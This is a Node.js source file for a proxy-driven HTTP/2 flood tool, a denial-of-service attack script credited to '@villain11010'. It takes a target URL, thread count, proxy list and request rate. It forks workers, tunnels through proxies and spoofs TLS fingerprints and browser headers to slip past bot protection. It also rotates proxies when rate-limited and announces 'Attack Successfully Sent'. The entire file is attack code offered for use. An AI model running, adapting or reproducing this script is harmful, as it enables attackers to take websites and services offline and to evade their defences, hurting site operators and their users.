Array.prototype.shuffle = function () {
    return this.sort(a => Math.random() - 0.5);
  }
  Object.prototype.shuffle = function () {
    const object = {};
    Object.keys(this).shuffle().forEach(key => object[key] = this[key]);
    return object;
  } 
const colors = require('colors');
const net = require("net")
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const os = require("os");
const v8 = require('v8');
const block = [".", "-", "&"].join("")
let maprate = []
const secureOptionsList = [
  crypto.constants.SSL_OP_NO_RENEGOTIATION,
  crypto.constants.SSL_OP_NO_TICKET,
  crypto.constants.SSL_OP_NO_SSLv2,
  crypto.constants.SSL_OP_NO_SSLv3,
  crypto.constants.SSL_OP_NO_COMPRESSION,
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
  crypto.constants.SSL_OP_TLSEXT_PADDING,
  crypto.constants.SSL_OP_ALL
];
const defaultCipherSuites = crypto.constants.defaultCoreCipherList.split(":");

const customCipherSuites = [
      "TLS_AES_128_GCM_SHA256",
      "TLS_AES_256_GCM_SHA384",
      "TLS_CHACHA20_POLY1305_SHA256",
      ...defaultCipherSuites
].join(":");
const pathii = [
    ".html", ".htm", ".css", ".js", ".jpg", ".jpeg", ".png", ".gif", ".svg",
    ".webp", ".woff", ".woff2", ".ttf", ".otf", ".eot", ".ico",
    ".json", ".xml", ".mp4", ".webm", ".ogg"
];
const randomPath = pathii[Math.floor(Math.random() * pathii.length)];
const sigalgs =  [
          "ecdsa_secp256r1_sha256",
          "ecdsa_secp384r1_sha384",
          "ecdsa_secp521r1_sha512",
          "rsa_pss_rsae_sha256",
          "rsa_pss_rsae_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha256",
          "rsa_pkcs1_sha384",
          "rsa_pkcs1_sha512",

        ].join(":");
const ecdh = [
"X25519",
"P-256",
"P-384",
"P-521",
"ffdhe2048",
"ffdhe3072"].join(":")
    const sysgay = [
    "Macintosh",
    "Windows 1.01",
    "Windows 1.02",
    "Windows 1.03",
    "Windows 1.04",
    "Windows 2.01",
    "Windows 3.0",
    "Windows NT 3.1",
    "Windows NT 3.5",
    "Windows 95",
    "Windows 98",
    "Windows 2006",
    "Windows NT 4.0",
    "Windows 95 Edition",
    "Windows 98 Edition",
    "Windows Me",
    "Windows Business",
    "Windows XP",
    "Windows 7",
    "Windows 8",
    "Windows 10 version 1507",
    "Windows 10 version 1511",
    "Windows 10 version 1607",
    "Windows 10 version 1703",
    ];
    const winarch = [
    "rv:40.0",
    "rv:41.0",
    "x86-16",
    "x86-16, IA32",
    "IA-32",
    "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC",
    "Itanium",
    "x86_64",
    "IA-32, x86-64",
    "IA-32, x86-64, ARM64",
    "x86-64, ARM64",
    "ARMv4, MIPS, SH-3",
    "ARMv4",
    "ARMv5",
    "ARMv7",
    "IA-32, x86-64, Itanium",
    "IA-32, x86-64, Itanium",
    "x86-64, Itanium",
    ];
    const winch = [
    "Intel Mac OS X 10.9",
    "Intel Mac OS X 10.7",
    "Intel Mac OS X 10_10_3",
    "Intel Mac OS X 10_10_1",
    "Intel Mac OS X 10_10_4",
    "2012 R2",
    "Win 64",
    "2019 R2",
    "2012 R2 Datacenter",
    "Server Blue",
    "Longhorn Server",
    "Whistler Server",
    "Shell Release",
    "Daytona",
    "Razzle",
    "HPC 2008",
    ];
     var nm2 = sysgay[Math.floor(Math.floor(Math.random() * sysgay.length))];
     var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
     var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
    cipher() {
        return cplist[Math.floor(Math.random() * cplist.length)];
    },
    sigalgs() {
        return sigalgs[Math.floor(Math.random() * sigalgs.length)];
    },
    ecdh() {
        return ecdh[Math.floor(Math.random() * ecdh.length)];
        }
}
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
let rps = process.argv[6];

if (!target || !time || !thread || !proxyFile || !rps) {
    console.log(`Example: node ${process.argv[1]} url time thread proxy.txt rate  --query true/false  --status true/false --ratelimit true/false`.grey);
    process.exit(1);
}

if (!/^https?:\/\//i.test(target)) {
    console.error('sent with http:// or https://');
    process.exit(1);
}

let proxys = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxys = proxyData.match(/\S+/g);
} catch (err) {
    console.error('Error proxy file:', err.message);
    process.exit(1);
}

if (isNaN(rps) || rps <= 0) {
    console.error('number rps');
    process.exit(1);
}
const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
}
let randbyte = 1
setInterval(()=>{
 randbyte++;
},1000)
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json,text/html;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json,application/xml;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/json;q=0.9,application/xml;q=0.8,*/*;q=0.7',
    'text/plain;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/pdf,text/html;q=0.8,*/*;q=0.7',
    'image/avif,image/webp,image/apng,image/png,image/jpeg,*/*;q=0.8',
    'text/html,application/xhtml+xml;q=0.8,image/avif,image/webp,*/*;q=0.7',
    'text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    '*/*;q=0.8',
];
language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];
  const   encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ]; 
  function randomversion(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const ver = randomversion(133,135);
   const usfi = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"  ,
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; Intel; rv:138.0) Gecko/20100101 Firefox/138.0  ",
   ];
   function randomFirefoxVersion() {
    return `${getRandomInt(133, 138)}.0`;
}
function randomOS() {
    const osOptions = [
        `Windows NT 10.0; Win64; x64`,
        `Macintosh; Intel Mac OS X 14_${getRandomInt(0, 4)}`,
        `X11; Linux x86_64`
    ];
    return osOptions[Math.floor(Math.random() * osOptions.length)];
}
function randomSecChUa() {
    const version = parseInt(randomFirefoxVersion());
    return `" Not A;Brand";v="8", "Chromium";v="${version}", "Firefox";v="${version}"`;
}

function randomSecChUaPlatform() {
    const os = randomOS();
    if (os.startsWith('Windows')) return '"Windows"';
    if (os.startsWith('Macintosh')) return '"macOS"';
    return '"Linux"';
}


    const plat = [
    "\"Windows\"",
    "\"Linux\"",
    "\"Android\"",
    "\"iOS\"",
    "\"Mac OS\"",
    "\"iPadOS\"",
    "\"BlackBerry OS\"",
    "\"Firefox OS\"",
  ];
  const searchEngines = [
    'https://www.google.com',
    'https://www.bing.com',
    'https://search.yahoo.com',
    'https://www.duckduckgo.com',
    'https://www.baidu.com',
    'https://www.yandex.com',
    'https://www.ecosia.org',
    'https://www.qwant.com',
    'https://www.startpage.com',
    'https://www.ask.com'
];


const randomEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
  const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];  
const ignoreList = [
    'apps',
    'docs',
    'rate-limit-test',
    'rss',
  ];
const statusCounts = {};

const countStatus = (status) => {
    if (!statusCounts[status]) {
        statusCounts[status] = 0;
    }
    statusCounts[status]++;
};

const printStatusCounts = () => {
    console.log(statusCounts);
    Object.keys(statusCounts).forEach(status => {
        statusCounts[status] = 0;
    });
};

function response(res) {
    const status = res[':status']
    countStatus(status)
}

function generateRandomString(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';

    if (minLength > maxLength) {
        [minLength, maxLength] = [maxLength, minLength];
    }

    const length = minLength === maxLength ? minLength : Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;

    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });

    return randomStringArray.join('');
}
function generateRandomStrings(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';

    if (minLength > maxLength) {
        [minLength, maxLength] = [maxLength, minLength];
    }

    const length = minLength === maxLength ? minLength : Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;

    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });

    return randomStringArray.join('');
}
const getUniqueHeaders = (function() {
  const adjectives = ['fast', 'quick', 'silent', 'noisy', 'bright', 'dark', 'calm', 'rough', 'smooth', 'fierce'];
  const nouns = ['eagle', 'tiger', 'lion', 'shark', 'wolf', 'panther', 'falcon', 'leopard', 'puma', 'cobra'];
  const suffixes = ['settings-', 'application-'];
  let pool = [];


  adjectives.forEach(adj => {
    nouns.forEach(noun => {
      suffixes.forEach(suffix => {
        pool.push(`${adj}-${noun}-${suffix}` + generateRandomString(5, 5));
      });
    });
  });


  pool.sort(() => Math.random() - 0.5);

  return function() {

    const shuffled = pool.slice().sort(() => Math.random() - 0.5);
    const selected = shuffled.slice(0, 3);

    const headers = {};
    selected.forEach(headerName => {
      const codeSnippet = `console.log('Header ${headerName}');`;
      const hexCode = Buffer.from(codeSnippet, 'utf8').toString('hex');
      headers[headerName] = hexCode;
    });
    return headers;
  };
})();
const argstos = process.argv.slice(2);
const queryIndextos = argstos.indexOf('--status');
tos = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;
const queryIndexcoo = argstos.indexOf('--cookie');
coo = queryIndexcoo !== -1 ? argstos[queryIndexcoo + 1] : null;

let cookie = ''
if (coo === "true") {
    "cache_push=" + generateRandomString(30, 100) + "; date=" + Date.now()
}
if (tos === 'true') {
    setInterval(printStatusCounts, 3000);
}
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
interval = randomDelay(500, 1000);
if (cluster.isMaster) {
  console.log(`   -   Status    : [ \x1b[32mAttack Successfully Sent\x1b[0m ]`);
  console.log("   -   Heapsize  : ", v8.getHeapStatistics().heap_size_limit / (1024 * 1024));
  console.log(`   -${'@villain11010 - Old script - 2025/08'.cyan.underline} # ${colors.dim.bold(new Date().toLocaleDateString("en"))}
   -${'bolochenco'.bold} [${'cbd'.underline}]`);
    console.log(`--------------------------------------------`.gray);
    console.log('[>] Target: '.blue + process.argv[2].cyan);
    console.log('[>] Time: '.blue + process.argv[3].cyan);
    console.log('[>] Rate: '.blue + process.argv[6].cyan);
    console.log(`--------------------------------------------`.gray);
    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }
    setTimeout(() =>{ console.clear(); process.exit(-1)}, time * 1000);

} else {
async function floodLoop() {
    while (true) {
        await flood();
          await new Promise(resolve => setImmediate(resolve));
    }
}

floodLoop().catch(err => {
    console.error("Error in flood loop:", err);
});
}

async function flood() {
    let parsed = url.parse(target);
    const currentTime = Date.now();
        maprate = maprate.filter(limit => currentTime - limit.timestamp <= 60000);
        (() => {
            const currentTime = Date.now();
            maprate = maprate.filter(limit => currentTime - limit.timestamp <= 60000);
        })();
        let proxy;
        do {
            proxy = proxyr().split(':');
        } while (maprate.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000));
const parseBoolean = (value) => value === "true";
const getArgumentValue = (args, flag, defaultValue = null) => {
    const index = args.indexOf(flag);
    return index !== -1 ? args[index + 1] : defaultValue;
};

const bypassconnect = process.argv.slice(2);

const ratelimit0 = parseBoolean(getArgumentValue(bypassconnect, '--ratelimit', "false"));
const post = getArgumentValue(process.argv.slice(7), '--post');
const query = getArgumentValue(process.argv.slice(7), '--query', null);
const querylenght = getArgumentValue(process.argv.slice(7), '--lenght', "1-1");
const redirect = parseBoolean(getArgumentValue(bypassconnect, "--redirect", false));
var usff = usfi[Math.floor(Math.floor(Math.random() * usfi.length))];
    let path = parsed.path
    if (parsed.path.includes('%rand%')) {
        path = parsed.path.replace("%rand%", generateRandomString(5, 7))
    } else {
        setInterval(() => {
            path = parsed.path 
        }, 1000);
    }
    let au = parsed.host.split(".")
    pathrr = "/" +generateRandomString(5, 7) + "/" + generateRandomString(5, 7) +randomPath
    let chead = {}
     chead["cookie"]= cookie
     let header = {
        // normal header //
        "Sec-Ch-Ua": randomSecChUa(),
        "Sec-Ch-Ua-Mobile": "?0",
         "Sec-Ch-Ua-Platform":  randomSecChUaPlatform(),
        "Upgrade-Insecure-Requests":"1",
         "User-Agent":usff,
        "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "Accept-Encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
        "Accept-Language": language_header[Math.floor(Math.random() * language_header.length)],
        "Sec-Fetch-Site":fetch_site[Math.floor(Math.random() * fetch_site.length)],
        "Sec-Fetch-Mode":fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest":fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
        "Priority": "u=0, i",
        "Sec-Purpose": "prefetch;prerender",
        "Purpose": "prefetch",
/////////////////////////////////////////////////////////////
// header random :)
          ...(Math.random() < 0.677897878878 ?{"Sec-Xdp-Floodgates": "bet-clc-"+ + generateRandomString(1, 2) }:{}),
          ...(Math.random() < 0.6767676767 ?{ "Purpure-Secretf-Id": "formula-" + generateRandomString(1, 2)}:{}),
         ...(Math.random() < 0.6 ?{[generateRandomString(1, 2)+"-SElF-DYNAMIC-"+generateRandomString(1, 2)]: "zero-"+generateRandomString(1, 2)}:{}),
          ...(Math.random() < 0.678787878787 ?{["HTTP-requests-with-unusual-HTTP-headers-or-URI-path-"+generateRandomString(1, 2)]: "Router-"+generateRandomString(1, 2)}:{}),
          ...(Math.random() < 0.6799898989899 ?{["Java-X-Xdp"+generateRandomString(1,2)]: "Toolsds-"+generateRandomString(1, 2)}:{}),
          ...(Math.random() < 0.67232323343 ?{["Root-User"+generateRandomString(1, 2) ]: "Villain-"+generateRandomString(1, 2)}:{}),     
          ...(Math.random() < 0.674343434434 ?{["Sys-NodeJs-"+generateRandomString(1, 2)]:  "Router-"+generateRandomString(1, 2)}:{}),
          ...(Math.random() < 0.83434343434  ?{"Origin": Math.random() < 0.2 ? "https://" + urihost[Math.floor(Math.random() * urihost.length)]  + (Math.random() < 0.2 ? ":" + getRandomInt(1,9999) + '/' : '@root/'): "https://"+ (Math.random() < 0.2 ?'root-admin.': 'root-root.') +randomEngine}:{}),
          ...(Math.random() < 0.55445545455454  ?{['X-Sec-Width-From-'+ generateRandomString(1,2)]: generateRandomString(1,2) + '-' +  generateRandomString(1,2) + '=' +generateRandomString(1,2)} : {}),
          ...(Math.random() < 0.554545454545  ?{['User-X-With-'+ generateRandomString(1,2)]: generateRandomString(1,2) + '-' +  generateRandomString(1,2) + '-' +generateRandomString(1,2)} : {}),
           ...(Math.random() < 0.67434343434343?{['X-C-Python-'+ generateRandomString(1,2)]: generateRandomString(1,2) + '-' +  generateRandomString(1,2) + '=' +generateRandomString(1,2)}:{}),
    }.shuffle()


    let pragmalenght = querylenght.split("-")
    if (querylenght !== "1-1"){
        pragmalenght = querylenght.split("-")
    }
    pargram = generateRandomString(pragmalenght[0],pragmalenght[1])
        async function createCustomTLSSocket(parsed, socket) {
            const tls_conn = await tls.connect({
                servername: parsed.host,
                host: parsed.host,
                port: 443,
                socket: socket,
                rejectUnauthorized: false,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ecdhCurve: 'X25519:prime256v1:secp384r1',
                ALPNProtocols: ['h2', 'http/1.1'],
                honorCipherOrder: true,    
                secureOptions:
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_COMPRESSION |
                    crypto.constants.SSL_OP_NO_RENEGOTIATION |
                    crypto.constants.SSL_OP_NO_TICKET |
                    crypto.constants.SSL_OP_TLSEXT_PADDING,
        
                ...(Math.random() < 0.5 ? { requestOCSP: true } : { requestCert: true }),
                highWaterMark: 16 * 1024
            });
        
            return tls_conn;
        } 
    const closeConnections = (client, connection,tlsSocket, socket, threaf) => {
        if (client) client.destroy();
        if (socket) socket.end();
        if (connection) connection.destroy()
        if (tlsSocket) tlsSocket.end();
        if (threaf) clearInterval(threaf);
}
    let procxy = []
    for (let o = 0; o < 10; o++) {
        const agent = await new http.Agent({
            host: proxy[0],
            port: proxy[1],
            keepAlive: true,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
        });
        const Optionsreq = {
            agent: agent,
            method: 'CONNECT',
            path: parsed.host + ':443',
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
                'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
            },
        };
        connection = await http.request(Optionsreq, (res) => {});
        connection.on('error', (err) => {

            if (err)  connection.destroy() ;return
        });
        connection.on('timeout', async () => {
            return
        });
        procxy.push(connection)
    }
    procxy.forEach((connection, index) => {
        connection.on('connect', async function(res, socket) {

            const tlsSocket = await createCustomTLSSocket(parsed, socket);
            const client = await http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                settings: {
                  headerTableSize: 65536,
                  enablePush: false,
                  initialWindowSize: 6291456,
                  maxHeaderListSize: 262144,
                }
              }, (session) => {
                session.setLocalWindowSize(15663105 + 65535);
              });

              client.on('error', err => {


                closeConnections(client, connection, tlsSocket, socket);
              });

              client.on('goaway', (errorCode, lastStreamID, opaqueData) => {

                client.close();
              });

              client.on('close', () => {

                closeConnections(client, connection, tlsSocket, socket);
              });


              client.once('connect', async () => {

                const intervalId = setInterval(async () => {
                  if (client.destroyed) {
                    clearInterval(intervalId);
                    client.close();
                    return;
                  }

                  for (let i = 0; i < rps; i++) {
                    let author = {
                      ...(post === 'true' ? { ":method": "POST" } : { ":method": 'GET' }),
                      "content-length": '0',
                      ":authority": parsed.host,
                      ":scheme": "https",
                      ":path": query === 'true'
                        ? (parsed.path.includes("%rand%")
                            ? parsed.path.replace("%rand%", generateRandomString(10, 10))
                            : parsed.path + generateRandomStrings(5, 20))
                        : query === 'query'
                          ? (parsed.path.includes("%rand%")
                              ? parsed.path.replace("%rand%", generateRandomString(10, 10))
                              : parsed.path + '?' + generateRandomStrings(5, 5))
                          : (parsed.path.includes("%rand%")
                              ? parsed.path.replace("%rand%", generateRandomString(10, 10))
                              : parsed.path),
                    };
                    var raw_socket = 'GET' + ' ' + parsed.path + ' HTTP/1.1\r\nAccept: '+accept_header[Math.floor(Math.random() * accept_header.length)]+'\r\nUpgrade-Insecure-Requests: 1\r\nHost: ' + parsed.host + '\r\nUser-Agent: ' + usff + '\r\nAccept-Language: '+ language_header[Math.floor(Math.random() * language_header.length)]+'\r\nAccept-Encoding: '+ encoding_header[Math.floor(Math.random() * encoding_header.length)]+'\r\nConnection: keep-alive\r\n\r\n';
                    const pre = (Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'));
                    const head = header;
                    const request = client.request({ ...author, ...head }, {
                      endStream: Math.random() < 0.5,
                      weight: 256,
                      parent: 0,
                      exclusive: true,
                    });

                    request.on('response', (res) => {
                    request.push(pre);
                      response(res);
                      const status1 = res[':status'];
                      if (ratelimit0 === true && res[':status'] === 429) {
                        maprate.push({ proxy: proxy, timestamp: Date.now() });
                        rps = 5;
                        client.destroy();
                        return;
                      }
                      if (res["set-cookie"]) {
                        chead["cookie"] = res["set-cookie"].join("; ");
                      }
                      if (redirect === true && res["location"]) {
                        parsed = new URL(res["location"]);
                      }
                    });
                    request.end();
                  }
                   tls_conn.write(raw_socket);
                }, interval);
                 
                setTimeout(() => {
                  client.destroy();
                }, 5 * 1000);

              });
                      });

        connection.end();
    });

} //
